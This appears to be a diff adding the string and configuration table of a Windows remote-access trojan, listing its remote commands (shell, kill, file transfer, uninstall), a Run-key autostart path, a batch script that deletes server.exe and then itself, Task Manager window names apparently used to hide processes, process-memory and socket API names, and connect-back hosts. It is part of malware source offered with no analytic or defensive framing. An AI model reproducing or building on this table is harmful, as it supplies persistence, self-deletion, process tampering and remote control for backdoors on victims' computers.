@@ -1,0 +1,145 @@
+s_echo echo
+s_die die
+s_uninstall uninstall
+s_info info
+s_files files
+s_filedel filedel
+s_filemkdir filemkdir
+s_filedeldir filedeldir
+s_fileout fileout
+s_filein filein
+s_process process
+s_refresh refresh
+s_kill kill
+s_run run
+s_msgbox msgbox
+s_shell shell
+s_on on
+s_off off
+s_msg msg
+s_login login
+s_fileaction fileaction
+s_fileinout fileinout
+s_processaction processaction
+s_explorer explorer.exe
+s_autostartorg Software\\Microsoft\\Windows\\CurrentVersion\\Run
+s_autostartnew Software\\Microsoft\\Windows\\CurrentSysInfo\\New
+s_error error
+s_stop stop
+s_end end
+s_success success
+s_failed failed
+s_drives drives
+s_95 95
+s_NT NT
+s_98 98
+s_ME ME
+s_2000 2000
+s_XP XP
+s_2003 2003
+s_unknown unknown
+s_Windows Windows
+s_Build Build
+s_Currentuser Current user
+s_SystemIP System IP
+s_noresolvehost couldn't resolve host
+s_Hostname Host name
+s_Systemdirectory System directory
+s_Date Date
+s_Time Time
+s_CPUspeed CPU speed
+s_GUID 645FF040-5081-101B-9F08-00AA002F954E
+s_Desktopini Desktop.ini
+s_Desktopinidata [.ShellClassInfo]
+s_RecycleBin Recycle Bin
+s_removeline1 @echo off
+s_removeline2 :kfg
+s_removeline3 erase server.exe > nul
+s_removeline4 ping 127.0.0.1 -n 2 > nul
+s_removeline5 if exist server.exe goto kfg
+s_removeline6 erase rm.bat > nul
+s_removefile rm.bat
+s_exit exit
+s_cmdexe cmd.exe
+s_Processes Processes
+s_SysListView32 SysListView32
+s_WindowsTaskManager Windows Task Manager
+dll_VirtualFreeEx VirtualFreeEx
+dll_VirtualAllocEx VirtualAllocEx
+dll_ReadProcessMemory ReadProcessMemory
+dll_WriteProcessMemory WriteProcessMemory
+dll_CreateThread CreateThread
+dll_TerminateThread TerminateThread
+dll_CreatePipe CreatePipe
+dll_PeekNamedPipe PeekNamedPipe
+dll_GetExitCodeProcess GetExitCodeProcess
+dll_GetStartupInfoA GetStartupInfoA
+dll_MultiByteToWideChar MultiByteToWideChar
+dll_CloseHandle CloseHandle
+dll_Process32First Process32First
+dll_Process32Next Process32Next
+dll_TerminateProcess TerminateProcess
+dll_OpenProcess OpenProcess
+dll_CreateToolhelp32Snapshot CreateToolhelp32Snapshot
+dll_GetSystemDirectoryA GetSystemDirectoryA
+dll_CreateProcessA CreateProcessA
+dll_GetModuleFileNameA GetModuleFileNameA
+dll_FindClose FindClose
+dll_FindFirstFileA FindFirstFileA
+dll_FindNextFileA FindNextFileA
+dll_GetLastError GetLastError
+dll_GetLogicalDriveStringsA GetLogicalDriveStringsA
+dll_DeleteFileA DeleteFileA
+dll_CreateDirectoryA CreateDirectoryA
+dll_RemoveDirectoryA RemoveDirectoryA
+dll_GetVersionExA GetVersionExA
+dll_SetFileAttributesA SetFileAttributesA
+dll_WSAStartup WSAStartup
+dll_WSACleanup WSACleanup
+dll_socket socket
+dll_connect connect
+dll_inet_addr inet_addr
+dll_htons htons
+dll_send send
+dll_recv recv
+dll_select select
+dll_setsockopt setsockopt
+dll_getsockname getsockname
+dll_closesocket closesocket
+dll_gethostbyname gethostbyname
+dll_gethostbyaddr gethostbyaddr
+dll_MessageBoxA MessageBoxA
+dll_GetWindowThreadProcessId GetWindowThreadProcessId
+dll_SendMessageA SendMessageA
+dll_GetClassNameA GetClassNameA
+dll_GetWindowTextA GetWindowTextA
+dll_EnumChildWindows EnumChildWindows
+dll_FindWindowA FindWindowA
+dll_GetUserNameA GetUserNameA
+dll_RegEnumValueA RegEnumValueA
+dll_RegQueryInfoKeyA RegQueryInfoKeyA
+dll_RegOpenKeyExA RegOpenKeyExA
+dll_RegCloseKey RegCloseKey
+dll_RegSetValueExA RegSetValueExA
+dll_RegCreateKeyExA RegCreateKeyExA
+dll_RegDeleteValueA RegDeleteValueA
+dll_ShellExecuteA ShellExecuteA
+dll_SHGetFolderPathA SHGetFolderPathA
+dll_CoCreateInstance CoCreateInstance
+dll_CoUninitialize CoUninitialize
+dll_CoInitializeEx CoInitializeEx
+dll_SysFreeString SysFreeString
+dll_SysAllocString SysAllocString
+dll_SysStringLen SysStringLen
+dll_kernel32 kernel32.dll
+dll_ws2_32 ws2_32.dll
+dll_user32 user32.dll
+dll_advapi32 advapi32.dll
+dll_shell32 shell32.dll
+dll_ole32 ole32.dll
+dll_oleaut32 oleaut32.dll
+cfg_name tester
+cfg_filename test.exe
+cfg_description Tester
+cfg_host1 127.0.0.1
+cfg_host2 192.168.0.8
